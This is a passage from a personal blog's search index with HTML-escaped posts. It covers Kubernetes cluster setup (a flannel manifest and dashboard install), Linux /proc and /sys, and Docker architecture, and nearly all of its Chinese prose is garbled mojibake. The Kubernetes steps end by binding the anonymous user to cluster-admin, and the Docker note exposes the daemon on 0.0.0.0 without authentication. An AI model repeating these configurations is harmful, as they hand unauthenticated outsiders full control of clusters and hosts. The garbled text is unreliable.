    seccomp.security.alpha.kubernetes.io/allowedProfileNames: docker/default
    seccomp.security.alpha.kubernetes.io/defaultProfileName: docker/default
    apparmor.security.beta.kubernetes.io/allowedProfileNames: runtime/default
    apparmor.security.beta.kubernetes.io/defaultProfileName: runtime/default
spec:
  privileged: false
  volumes:
    - configMap
    - secret
    - emptyDir
    - hostPath
  allowedHostPaths:
    - pathPrefix: &amp;quot;/etc/cni/net.d&amp;quot;
    - pathPrefix: &amp;quot;/etc/kube-flannel&amp;quot;
    - pathPrefix: &amp;quot;/run/flannel&amp;quot;
  readOnlyRootFilesystem: false
  # Users and groups
  runAsUser:
    rule: RunAsAny
  supplementalGroups:
    rule: RunAsAny
  fsGroup:
    rule: RunAsAny
  # Privilege Escalation
  allowPrivilegeEscalation: false
  defaultAllowPrivilegeEscalation: false
  # Capabilities
  allowedCapabilities: [&#39;NET_ADMIN&#39;]
  defaultAddCapabilities: []
  requiredDropCapabilities: []
  # Host namespaces
  hostPID: false
  hostIPC: false
  hostNetwork: true
  hostPorts:
  - min: 0
    max: 65535
  # SELinux
  seLinux:
    # SELinux is unsed in CaaSP
    rule: &#39;RunAsAny&#39;
---
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1beta1
metadata:
  name: flannel
rules:
  - apiGroups: [&#39;extensions&#39;]
    resources: [&#39;podsecuritypolicies&#39;]
    verbs: [&#39;use&#39;]
    resourceNames: [&#39;psp.flannel.unprivileged&#39;]
  - apiGroups:
      - &amp;quot;&amp;quot;
    resources:
      - pods
    verbs:
      - get
  - apiGroups:
      - &amp;quot;&amp;quot;
    resources:
      - nodes
    verbs:
      - list
      - watch
  - apiGroups:
      - &amp;quot;&amp;quot;
    resources:
      - nodes/status
    verbs:
      - patch
---
kind: ClusterRoleBinding
apiVersion: rbac.authorization.k8s.io/v1beta1
metadata:
  name: flannel
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: flannel
subjects:
- kind: ServiceAccount
  name: flannel
  namespace: kube-system
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: flannel
  namespace: kube-system
---
kind: ConfigMap
apiVersion: v1
metadata:
  name: kube-flannel-cfg
  namespace: kube-system
  labels:
    tier: node
    app: flannel
data:
  cni-conf.json: |
    {
      &amp;quot;cniVersion&amp;quot;: &amp;quot;0.2.0&amp;quot;,
      &amp;quot;name&amp;quot;: &amp;quot;cbr0&amp;quot;,
      &amp;quot;plugins&amp;quot;: [
        {
          &amp;quot;type&amp;quot;: &amp;quot;flannel&amp;quot;,
          &amp;quot;delegate&amp;quot;: {
            &amp;quot;hairpinMode&amp;quot;: true,
            &amp;quot;isDefaultGateway&amp;quot;: true
          }
        },
        {
          &amp;quot;type&amp;quot;: &amp;quot;portmap&amp;quot;,
          &amp;quot;capabilities&amp;quot;: {
            &amp;quot;portMappings&amp;quot;: true
          }
        }
      ]
    }
  net-conf.json: |
    {
      &amp;quot;Network&amp;quot;: &amp;quot;10.244.0.0/16&amp;quot;,
      &amp;quot;Backend&amp;quot;: {
        &amp;quot;Type&amp;quot;: &amp;quot;vxlan&amp;quot;
      }
    }
---
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: kube-flannel-ds-amd64
  namespace: kube-system
  labels:
    tier: node
    app: flannel
spec:
  selector:
    matchLabels:
      app: flannel
  template:
    metadata:
      labels:
        tier: node
        app: flannel
    spec:
      affinity:
        nodeAffinity:
          requiredDuringSchedulingIgnoredDuringExecution:
            nodeSelectorTerms:
              - matchExpressions:
                  - key: beta.kubernetes.io/os
                    operator: In
                    values:
                      - linux
                  - key: beta.kubernetes.io/arch
                    operator: In
                    values:
                      - amd64
      hostNetwork: true
      tolerations:
      - operator: Exists
        effect: NoSchedule
      serviceAccountName: flannel
      initContainers:
      - name: install-cni
        image: lizhenliang/flannel:v0.11.0-amd64 
        command:
        - cp
        args:
        - -f
        - /etc/kube-flannel/cni-conf.json
        - /etc/cni/net.d/10-flannel.conflist
        volumeMounts:
        - name: cni
          mountPath: /etc/cni/net.d
        - name: flannel-cfg
          mountPath: /etc/kube-flannel/
      containers:
      - name: kube-flannel
        image: lizhenliang/flannel:v0.11.0-amd64 
        command:
        - /opt/bin/flanneld
        args:
        - --ip-masq
        - --kube-subnet-mgr
        resources:
          requests:
            cpu: &amp;quot;100m&amp;quot;
            memory: &amp;quot;50Mi&amp;quot;
          limits:
            cpu: &amp;quot;100m&amp;quot;
            memory: &amp;quot;50Mi&amp;quot;
        securityContext:
          privileged: false
          capabilities:
             add: [&amp;quot;NET_ADMIN&amp;quot;]
        env:
        - name: POD_NAME
          valueFrom:
            fieldRef:
              fieldPath: metadata.name
        - name: POD_NAMESPACE
          valueFrom:
            fieldRef:
              fieldPath: metadata.namespace
        volumeMounts:
        - name: run
          mountPath: /run/flannel
        - name: flannel-cfg
          mountPath: /etc/kube-flannel/
      volumes:
        - name: run
          hostPath:
            path: /run/flannel
        - name: cni
          hostPath:
            path: /etc/cni/net.d
        - name: flannel-cfg
          configMap:
            name: kube-flannel-cfg


kubectl apply -f kube-flannel.yml

kubectl get pods -n kube-system
NAME                             READY   STATUS    RESTARTS   AGE
coredns-7f89b7bc75-5bk98         1/1     Running   0          22m
coredns-7f89b7bc75-cz8vq         1/1     Running   0          22m
etcd-master                      1/1     Running   0          22m
kube-apiserver-master            1/1     Running   0          22m
kube-controller-manager-master   1/1     Running   0          22m
kube-flannel-ds-amd64-2cpdk      1/1     Running   0          7m3s
kube-flannel-ds-amd64-4xntj      1/1     Running   0          7m3s
kube-flannel-ds-amd64-khqfw      1/1     Running   0          7m3s
kube-proxy-7rc7h                 1/1     Running   0          22m
kube-proxy-fncg8                 1/1     Running   0          16m
kube-proxy-rd6kl                 1/1     Running   0          16m
kube-scheduler-master            1/1     Running   0          22m

kubectl get pod -n kube-system -o wide

&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;åœ¨kubectl get pods -n kube-systemï¼Œå¦‚æœå‘ç°æœ‰ImagePullBackOffæˆ–è€…ErrImagePullï¼Œä¾‹å¦‚coredns-545d6fc579-4jw9wé•œåƒæ˜¯ImagePullBackOffçŠ¶æ€ï¼Œé‚£ä¹ˆæ‰§è¡Œ&lt;br&gt;
kubectl get pods coredns-545d6fc579-4jw9w -n kube-system -o yaml | grep image:&lt;br&gt;
æŸ¥çœ‹æ²¡æœ‰æ‹‰å»ä¸‹æ¥çš„é•œåƒçš„å…¨ç§°ï¼Œä¾‹å¦‚ï¼š&lt;br&gt;
registry.aliyuncs.com/google_containers/coredns/coredns:v1.8.0æ— æ³•ä¸‹è½½ä¸‹æ¥ï¼Œç„¶åæ‰‹åŠ¨docker pullæ‹‰å–ä¸‹æ¥(æœ‰æ—¶å€™åªæ˜¯é•œåƒçš„å‘½åé—®é¢˜è€Œæç¤ºæ‰¾ä¸åˆ°é•œåƒ)ï¼šdocker pull coredns/coredns:1.8.0ï¼Œç„¶åæ‰‹åŠ¨å°†æ‹‰å»ä¸‹æ¥çš„é•œåƒæ”¹ä»¥ä¸‹tag:&lt;br&gt;
sudo docker tag coredns/coredns:1.8.0  registry.aliyuncs.com/google_containers/coredns/coredns:v1.8.0&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;7-æµ‹è¯•kubernetesé›†ç¾¤&#34;&gt;7. æµ‹è¯•kubernetesé›†ç¾¤&lt;/h2&gt;
&lt;p&gt;åœ¨Kubernetesé›†ç¾¤ä¸­åˆ›å»ºä¸€ä¸ªpodï¼ŒéªŒè¯æ˜¯å¦æ­£å¸¸è¿è¡Œï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ kubectl create deployment nginx --image=nginx
$ kubectl expose deployment nginx --port=80 --type=NodePort
$ kubectl get pod,svc
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è®¿é—®åœ°å€ï¼š&lt;code&gt;http://NodeIP:Port&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;8-å®‰è£…dashboard&#34;&gt;8. å®‰è£…dashboard&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;ä¸‹è½½yaml&lt;br&gt;
&lt;code&gt;wget https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.4/aio/deploy/recommended.yaml&lt;/code&gt;&lt;br&gt;
&lt;a href=&#34;https://www.cnblogs.com/LMIx/p/14477299.html&#34;&gt;å…³äºraw.githubusercontent.com failed: Connection&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ä¿®æ”¹yaml&lt;br&gt;
&lt;img src=&#34;https://img2020.cnblogs.com/blog/1129222/202103/1129222-20210303222100336-1778831657.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ‰§è¡Œå®‰è£…&lt;br&gt;
&lt;code&gt;kubectl apply -f recommended.yaml&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;åˆ›å»º serviceaccount&lt;br&gt;
&lt;code&gt;kubectl create serviceaccount dashboard-admin -n kube-system&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;åˆ›å»ºclusterrolebindingä¸ºdashboard saæˆæƒé›†ç¾¤æƒé™cluster-admin&lt;br&gt;
&lt;code&gt;kubectl create clusterrolebinding dashboard-admin --clusterrole=cluster-admin --serviceaccount=kube-system:dashboard-admin&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æŸ¥çœ‹dashboardæ‰€åœ¨node å¯ä»¥ç”¨&lt;code&gt;kubectl get pods -A -o wide &lt;/code&gt;,ç„¶åæ‰¾åˆ°dashboard æ‰€åœ¨çš„nodeèŠ‚ç‚¹.&lt;br&gt;
&lt;img src=&#34;https://img2020.cnblogs.com/blog/1129222/202103/1129222-20210303222344433-155445658.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ä½¿ç”¨token ç™»é™†,è·å–token:&lt;code&gt;kubectl describe secrets -n kube-system $(kubectl -n kube-system get secret | awk &#39;/dashboard-admin/{print $1}&#39;)&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://img2020.cnblogs.com/blog/1129222/202103/1129222-20210303222405372-1143767227.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://img2020.cnblogs.com/blog/1129222/202103/1129222-20210303222409587-1300734287.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;å…³äºdashboardçš„podä¸€ç›´å¤„äºpendingçŠ¶æ€ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kubectl delete -f recommended.yaml

vi recommended.yaml

å°†æ‰€æœ‰
nodeSelector:
  &amp;quot;kubernetes.io/os&amp;quot;: linux
æ³¨é‡Šæ‰

kubectl apply -f recommended.yaml
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸ºåŒ¿åç”¨æˆ·ç»‘å®šç®¡ç†å‘˜æƒé™&lt;/p&gt;
&lt;p&gt;kubectl create clusterrolebinding test:anonymous --clusterrole=cluster-admin --user=system:anonymous&lt;/p&gt;
">ã€k8sã€‘k8sç¯å¢ƒæ­å»º</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-proc/"" data-c="
          &lt;h2 id=&#34;proc&#34;&gt;/proc&lt;/h2&gt;
&lt;p&gt;Linuxç³»ç»Ÿä¸Šçš„/procç›®å½•æ˜¯ä¸€ç§æ–‡ä»¶ç³»ç»Ÿï¼Œå³procæ–‡ä»¶ç³»ç»Ÿã€‚ä¸å…¶å®ƒå¸¸è§çš„æ–‡ä»¶ç³»ç»Ÿä¸åŒçš„æ˜¯ï¼Œ/procæ˜¯ä¸€ç§ä¼ªæ–‡ä»¶ç³»ç»Ÿï¼ˆä¹Ÿå³è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼‰ï¼Œå­˜å‚¨çš„æ˜¯å½“å‰å†…æ ¸è¿è¡ŒçŠ¶æ€çš„ä¸€ç³»åˆ—ç‰¹æ®Šæ–‡ä»¶ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è¿™äº›æ–‡ä»¶æŸ¥çœ‹æœ‰å…³ç³»ç»Ÿç¡¬ä»¶åŠå½“å‰æ­£åœ¨è¿è¡Œè¿›ç¨‹çš„ä¿¡æ¯ï¼Œç”šè‡³å¯ä»¥é€šè¿‡æ›´æ”¹å…¶ä¸­æŸäº›æ–‡ä»¶æ¥æ”¹å˜å†…æ ¸çš„è¿è¡ŒçŠ¶æ€ã€‚å…¶å®ä¾‹å¦‚psã€topç­‰å¾ˆå¤šå‘½ä»¤æ­£æ˜¯ä»procç³»ç»Ÿä¸­è¯»å–ä¿¡æ¯ã€‚&lt;/p&gt;
&lt;p&gt;åŸºäº/procæ–‡ä»¶ç³»ç»Ÿå¦‚ä¸Šæ‰€è¿°çš„ç‰¹æ®Šæ€§ï¼Œå…¶å†…çš„æ–‡ä»¶ä¹Ÿå¸¸è¢«ç§°ä½œè™šæ‹Ÿæ–‡ä»¶ï¼Œå¹¶å…·æœ‰ä¸€äº›ç‹¬ç‰¹çš„ç‰¹ç‚¹ã€‚ä¾‹å¦‚ï¼Œå…¶ä¸­æœ‰äº›æ–‡ä»¶è™½ç„¶ä½¿ç”¨æŸ¥çœ‹å‘½ä»¤æŸ¥çœ‹æ—¶ä¼šè¿”å›å¤§é‡ä¿¡æ¯ï¼Œä½†æ–‡ä»¶æœ¬èº«çš„å¤§å°å´ä¼šæ˜¾ç¤ºä¸º0å­—èŠ‚ã€‚æ­¤å¤–ï¼Œè¿™äº›ç‰¹æ®Šæ–‡ä»¶ä¸­å¤§å¤šæ•°æ–‡ä»¶çš„æ—¶é—´åŠæ—¥æœŸå±æ€§é€šå¸¸ä¸ºå½“å‰ç³»ç»Ÿæ—¶é—´å’Œæ—¥æœŸï¼Œè¿™è·Ÿå®ƒä»¬éšæ—¶ä¼šè¢«åˆ·æ–°ï¼ˆå­˜å‚¨äºRAMä¸­ï¼‰æœ‰å…³ã€‚&lt;/p&gt;
&lt;p&gt;ä¸ºäº†æŸ¥çœ‹åŠä½¿ç”¨ä¸Šçš„æ–¹ä¾¿ï¼Œè¿™äº›æ–‡ä»¶é€šå¸¸ä¼šæŒ‰ç…§ç›¸å…³æ€§è¿›è¡Œåˆ†ç±»å­˜å‚¨äºä¸åŒçš„ç›®å½•ç”šè‡³å­ç›®å½•ä¸­ï¼Œå¦‚/proc/scsiç›®å½•ä¸­å­˜å‚¨çš„å°±æ˜¯å½“å‰ç³»ç»Ÿä¸Šæ‰€æœ‰SCSIè®¾å¤‡çš„ç›¸å…³ä¿¡æ¯ï¼Œ/proc/N/ä¸­å­˜å‚¨çš„åˆ™æ˜¯ç³»ç»Ÿå½“å‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹çš„ç›¸å…³ä¿¡æ¯ï¼Œå…¶ä¸­Nä¸ºæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ï¼ˆå¯ä»¥æƒ³è±¡å¾—åˆ°ï¼Œåœ¨æŸè¿›ç¨‹ç»“æŸåå…¶ç›¸å…³ç›®å½•åˆ™ä¼šæ¶ˆå¤±ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;å¤§å¤šæ•°è™šæ‹Ÿæ–‡ä»¶å¯ä»¥ä½¿ç”¨æ–‡ä»¶æŸ¥çœ‹å‘½ä»¤å¦‚catã€moreæˆ–è€…lessè¿›è¡ŒæŸ¥çœ‹ï¼Œæœ‰äº›æ–‡ä»¶ä¿¡æ¯è¡¨è¿°çš„å†…å®¹å¯ä»¥ä¸€ç›®äº†ç„¶ï¼Œä½†ä¹Ÿæœ‰æ–‡ä»¶çš„ä¿¡æ¯å´ä¸æ€ä¹ˆå…·æœ‰å¯è¯»æ€§ã€‚ä¸è¿‡ï¼Œè¿™äº›å¯è¯»æ€§è¾ƒå·®çš„æ–‡ä»¶åœ¨ä½¿ç”¨ä¸€äº›å‘½ä»¤å¦‚apmã€freeã€lspciæˆ–topæŸ¥çœ‹æ—¶å´å¯ä»¥æœ‰ç€ä¸é”™çš„è¡¨ç°ã€‚&lt;/p&gt;
&lt;h3 id=&#34;å¸¸è§æ–‡ä»¶&#34;&gt;å¸¸è§æ–‡ä»¶&lt;/h3&gt;
&lt;h4 id=&#34;ä»¥æ•°å­—å‘½åçš„å­ç›®å½•&#34;&gt;ä»¥æ•°å­—å‘½åçš„å­ç›®å½•&lt;/h4&gt;
&lt;p&gt;/procç›®å½•ä¸­åŒ…å«è®¸å¤šä»¥æ•°å­—å‘½åçš„å­ç›®å½•ï¼Œè¿™äº›æ•°å­—è¡¨ç¤ºç³»ç»Ÿå½“å‰æ­£åœ¨è¿è¡Œè¿›ç¨‹çš„è¿›ç¨‹å·ï¼Œé‡Œé¢åŒ…å«å¯¹åº”è¿›ç¨‹ç›¸å…³çš„å¤šä¸ªä¿¡æ¯æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;dr-xr-xr-x.  9 root    root                  0 Jul 17 01:47 1
dr-xr-xr-x.  9 root    root                  0 Jul 17 01:47 10
dr-xr-xr-x.  9 root    root                  0 Jul 17 03:21 1003
dr-xr-xr-x.  9 root    root                  0 Jul 17 01:47 1082
dr-xr-xr-x.  9 root    root                  0 Jul 17 01:47 1085
dr-xr-xr-x.  9 root    root                  0 Jul 17 01:47 1086
dr-xr-xr-x.  9 root    root                  0 Jul 17 01:47 11
dr-xr-xr-x.  9 root    root                  0 Jul 17 01:47 117
dr-xr-xr-x.  9 root    root                  0 Jul 17 01:47 12
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ¯ä¸ªå­æ–‡ä»¶ä¸­åˆåŒ…å«äº†è¯¥è¿›ç¨‹çš„ç›¸å…³ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ls /proc/2977/
attr    # æä¾›å®‰å…¨ç›¸å…³å±æ€§
autogroup
auxv
cgroup # æ‰€å±cgroup
clear_refs
cmdline # å‘½ä»¤è¡Œå‚æ•°
comm
coredump_filter
cpuset
cwd -&amp;gt; / # å½“å‰å·¥ä½œç›®å½•çš„è½¯è¿æ¥
environ # ç¯å¢ƒå˜é‡å€¼
exe -&amp;gt; /usr/sbin/sshd # æŒ‡å‘è¯¥è¿›ç¨‹çš„æ‰§è¡Œå‘½ä»¤æ–‡ä»¶
fd # ä¸€ä¸ªåŒ…å«æ‰€æœ‰æ–‡ä»¶æè¿°ç¬¦çš„ç›®å½•
fdinfo
gid_map
io
limits
loginuid
map_files
maps # å†…å­˜æ˜ å°„ä¿¡æ¯
mem # è¿›ç¨‹çš„å†…å­˜è¢«åˆ©ç”¨çš„æƒ…å†µ
mountinfo
mounts
mountstats
net
ns
numa_maps
oom_adj
oom_score
oom_score_adj
pagemap
patch_state
personality
projid_map
root -&amp;gt; / # é“¾æ¥åˆ°æ­¤è¿›ç¨‹çš„rootç›®å½•
sched
schedstat
sessionid
setgroups
smaps
stack
stat # è¿›ç¨‹çŠ¶æ€
statm # è¿›ç¨‹å†…å­˜ä½¿ç”¨ä¿¡æ¯
status # è¿›ç¨‹å½“å‰çŠ¶æ€ï¼Œä»¥å¯è¯»çš„æ–¹å¼æ˜¾ç¤º
syscall
task
timers
uid_map
wchan
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;å¸¸ç”¨ç³»ç»Ÿä¿¡æ¯æ–‡ä»¶&#34;&gt;å¸¸ç”¨ç³»ç»Ÿä¿¡æ¯æ–‡ä»¶&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;/proc/cpuinfo # CPUçš„ä¿¡æ¯(å‹å·ã€å®¶æ—ã€ç¼“å­˜å¤§å°)
/proc/meminfo # ç‰©ç†å†…å­˜ã€äº¤æ¢ç©ºé—´ç­‰ä¿¡æ¯
/proc/mounts # å·²åŠ è½½çš„æ–‡ä»¶ç³»ç»Ÿåˆ—è¡¨
/proc/filesystems # è¢«æ”¯æŒçš„æ–‡ä»¶ç³»ç»Ÿ
/proc/modules # å·²åŠ è½½çš„æ¨¡å—
/proc/version # å†…æ ¸ç‰ˆæœ¬
/proc/cmdline # ç³»ç»Ÿå¯åŠ¨æ—¶è¾“å…¥çš„å†…æ ¸å‘½ä»¤è¡Œå‚æ•°
/proc/interrupts # ä¸­æ–­ä½¿ç”¨æƒ…å†µ
/proc/kmsg # å†…æ ¸æ—¥å¿—ä¿¡æ¯
/proc/devices # å¯ç”¨çš„è®¾å¤‡ï¼Œå¦‚å­—ç¬¦è®¾å¤‡å’Œå—è®¾å¤‡
/proc/uptime # ç³»ç»Ÿæ­£å¸¸è¿è¡Œæ—¶é—´
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;sys&#34;&gt;/sys&lt;/h2&gt;
&lt;p&gt;å®ƒå¯ä»¥äº§ç”Ÿä¸€ä¸ªåŒ…å«æ‰€æœ‰ç³»ç»Ÿç¡¬ä»¶å±‚æ¬¡è§†å›¾ï¼Œé€šè¿‡æŠŠè¿æ¥åœ¨ç³»ç»Ÿä¸Šçš„è®¾å¤‡å’Œæ€»çº¿ç»„ç»‡ç§°ä¸ºä¸€ä¸ªåˆ†çº§çš„æ–‡ä»¶ï¼Œå®ƒä»¬å¯ä»¥ç”±ç”¨æˆ·ç©ºé—´è·å–ï¼Œå‘ç”¨æˆ·ç©ºé—´å¯¼å‡ºå†…æ ¸çš„æ•°æ®ç»“æ„ä»¥åŠå®ƒä»¬çš„å±æ€§ã€‚sysfsçš„ä¸€ä¸ªç›®çš„å°±æ˜¯å±•ç¤ºè®¾å¤‡é©±åŠ¨æ¨¡å‹ä¸­å„ç»„ä»¶çš„å±‚æ¬¡å…³ç³»ã€‚&lt;/p&gt;
&lt;p&gt;æœªå®Œ&lt;/p&gt;
&lt;p&gt;å› æ­¤ï¼Œç³»ç»Ÿä¸­æ•´ä½“ä¿¡æ¯å¯é€šè¿‡procfsæ¥è·å–ï¼Œè®¾å¤‡æ¨¡å‹ç›¸å…³ä¿¡æ¯å¯é€šè¿‡sysfsæ¥è·å–ã€‚&lt;/p&gt;
">ã€linuxã€‘/procå’Œ/sysæ–‡ä»¶ç³»ç»Ÿ</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/docker-zu-jian-jia-gou/"" data-c="
          &lt;h2 id=&#34;dockeræ¶æ„&#34;&gt;Dockeræ¶æ„&lt;/h2&gt;
&lt;p&gt;Dockeré‡‡ç”¨C/Sæ¶æ„ï¼Œé€šè¿‡socket/RESTful APIè¿›è¡Œé€šä¿¡ã€‚&lt;/p&gt;
&lt;h3 id=&#34;docker-daemon&#34;&gt;Docker daemon&lt;/h3&gt;
&lt;p&gt;Docker daemonä½œä¸ºæœåŠ¡ç«¯å®ˆæŠ¤è¿›ç¨‹ï¼Œæ¥å—å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚å¹¶ç®¡ç†Dockerå¯¹è±¡ï¼Œä¾‹å¦‚imagesã€containersã€networkså’Œvolumesï¼ŒåŒæ—¶å®ˆæŠ¤è¿›ç¨‹è¿˜å¯ä»¥ä¸å…¶ä»–å®ˆæŠ¤è¿›ç¨‹é€šä¿¡ä»¥ç®¡ç†DockeræœåŠ¡ã€‚&lt;/p&gt;
&lt;p&gt;é»˜è®¤ç›‘å¬æœ¬åœ°&lt;code&gt;unix:///var/run/docker.sock&lt;/code&gt;å¥—æ¥å­—ï¼Œåªå…è®¸æœ¬åœ°rootè®¿é—®ï¼Œé€šè¿‡-Hæ¥ä¿®æ”¹ç›‘å¬æ–¹å¼ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# ç›‘å¬æœ¬åœ°TCP 1234ç«¯å£
$ sudo docker -H 0.0.0.0:1234 -d &amp;amp;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœåŠ¡ç«¯é»˜è®¤å¯åŠ¨é…ç½®æ–‡ä»¶åœ¨&lt;code&gt;/etc/default/docker&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;h3 id=&#34;docker-client&#34;&gt;Docker client&lt;/h3&gt;
&lt;p&gt;Dockerå®¢æˆ·ç«¯ä¸ºç”¨æˆ·æä¾›ä¸€ç³»åˆ—å¯æ‰§è¡Œå‘½ä»¤ï¼Œä¸Docker daemonäº¤äº’ï¼Œå®¢æˆ·ç«¯å‘é€å‘½ä»¤åï¼Œç­‰å¾…æœåŠ¡ç«¯è¿”å›ï¼Œä¸€æ—¦æ”¶åˆ°è¿”å›åï¼Œç«‹åˆ»æ‰§è¡Œå¹¶é€€å‡ºã€‚&lt;/p&gt;
&lt;p&gt;é»˜è®¤é€šè¿‡æœ¬åœ°&lt;code&gt;unix:///var/run/docker.sock&lt;/code&gt;å¥—æ¥å­—å‘æœåŠ¡ç«¯å‘é€å‘½ä»¤ï¼Œå¦‚æœæœåŠ¡ç«¯æ²¡æœ‰ç›‘å¬é»˜è®¤å¥—æ¥å­—ï¼Œéœ€è¦åœ¨å®¢æˆ·ç«¯æ˜¾å¼æŒ‡å®šï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;docker -H tcp://127.0.0.1:1234 version
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1644538102794.svg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;docker-registries&#34;&gt;Docker registries&lt;/h3&gt;
&lt;p&gt;Docker registriesç”¨äºå­˜å‚¨Docker imagesï¼ŒDocker Hubæ˜¯ä»»ä½•äººéƒ½å¯ä»¥ä½¿ç”¨çš„å…¬å…±registryï¼ŒDockeré»˜è®¤çš„registryæ˜¯Docker Hubã€‚ä¹Ÿå¯ä»¥æ³¨å†Œç§äººregistryã€‚&lt;/p&gt;
&lt;p&gt;å½“ä½¿ç”¨&lt;code&gt;docker pull/run&lt;/code&gt;æˆ–&lt;code&gt;docker push&lt;/code&gt;å‘½ä»¤æ—¶ï¼Œæ‰€éœ€çš„imageå°†ä»é…ç½®çš„registryä¸­ä¸‹è½½æˆ–ä¸Šä¼ ã€‚&lt;/p&gt;
&lt;h3 id=&#34;docker-object&#34;&gt;Docker object&lt;/h3&gt;
&lt;p&gt;Dockerä¸­çš„imagesã€containersã€networksã€volumesã€pluginsç­‰éƒ½ç§°ä¸ºDocker objectã€‚&lt;/p&gt;
&lt;h4 id=&#34;images&#34;&gt;images&lt;/h4&gt;
&lt;p&gt;imageæ˜¯ä¸€ä¸ªåªè¯»çš„çš„æ¨¡æ¿ï¼Œå®ƒåŒ…å«äº†åˆ›å»ºDocker containerçš„ä¸€äº›æŒ‡ä»¤ç­‰è¯´æ˜ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œä¸€ä¸ªimageæ˜¯åŸºäºå¦ä¸€ä¸ªimageåˆ›å»ºçš„ï¼ŒåŠ ä¸Šäº†ä¸€äº›ç‰¹æ®Šçš„å®šåˆ¶ç¯å¢ƒã€‚ä¾‹å¦‚åŸºç¡€ubantu imageå’ŒåŸºäºå…¶åˆ›å»ºçš„å…·æœ‰apache webæœåŠ¡çš„ubantu imageã€‚&lt;/p&gt;
&lt;p&gt;å¯é€šè¿‡Dockerfileçš„æ–¹å¼åˆ›å»ºé•œåƒï¼ŒDockerfileåˆ›å»ºé•œåƒå¯ç†è§£ä¸ºä¸€ä¸ªåˆ†å±‚æ¨¡å‹ï¼ŒDockerfileä¸­æ¯ä¸€æ¡æŒ‡ä»¤éƒ½ä¼šåˆ›å»ºä¸€ä¸ªå±‚ï¼Œå½“æ”¹å˜Dockerfileé‡å»ºé•œåƒæ—¶ï¼Œåªè®²å¯¹åº”çš„å±‚é‡å»ºå³å¯ï¼Œè¿™ä¹Ÿæ˜¯imageè½»é‡åŒ–çš„ä¸€ä¸ªåŸå› ã€‚&lt;/p&gt;
&lt;h4 id=&#34;container&#34;&gt;container&lt;/h4&gt;
&lt;p&gt;å®¹å™¨æ˜¯ä¸€ä¸ªé•œåƒçš„å¯è¿è¡Œå®ä¾‹ï¼Œå¯é€šè¿‡å®¢æˆ·ç«¯å¯¹å…¶è¿›è¡Œåˆ›å»ºï¼Œå¯åŠ¨ï¼Œåœæ­¢æˆ–åˆ é™¤ç­‰ä¸€ç³»åˆ—æ“ä½œã€‚ä¸€ä¸ªå®¹å™¨å¯ä»¥è¿æ¥ä¸€ä¸ªæˆ–å¤šä¸ªç½‘ç»œã€ä¸€ä¸ªæˆ–å¤šä¸ªå­˜å‚¨è®¾å¤‡ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥åŸºäºå…¶å½“å‰çŠ¶æ€åˆ›å»ºä¸€ä¸ªæ–°çš„é•œåƒã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker run -i -t ubantu /bin/bash&lt;/code&gt;&lt;/p&gt;
